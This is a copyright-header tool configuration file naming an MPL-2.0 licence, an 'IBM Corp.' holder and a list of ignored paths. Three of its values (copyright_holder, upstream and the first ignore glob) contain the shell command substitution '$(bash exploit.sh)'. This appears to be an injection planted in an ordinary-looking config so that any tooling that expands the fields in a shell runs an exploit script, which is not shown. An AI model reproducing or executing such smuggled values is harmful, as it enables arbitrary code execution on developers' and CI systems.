schema_version = 1

project {
  license = "MPL-2.0"
  copyright_holder = "IBM Corp. $(bash exploit.sh)"
  upstream = "$(bash exploit.sh)"

  copyright_year = 2020

  # (OPTIONAL) A list of globs that should not have copyright/license headers.
  # Supports doublestar glob patterns for more flexibility in defining which
  # files or folders should be ignored
  header_ignore = [
    "$(bash exploit.sh)",
    "**/testdata/**",
    "**/testdata-initialize/**",
    ".github/ISSUE_TEMPLATE/**",
    ".changes/**",
    "internal/schemas/gen-workspace/**",
    "internal/schemas/tf-plugin-cache/**",
  ]
}
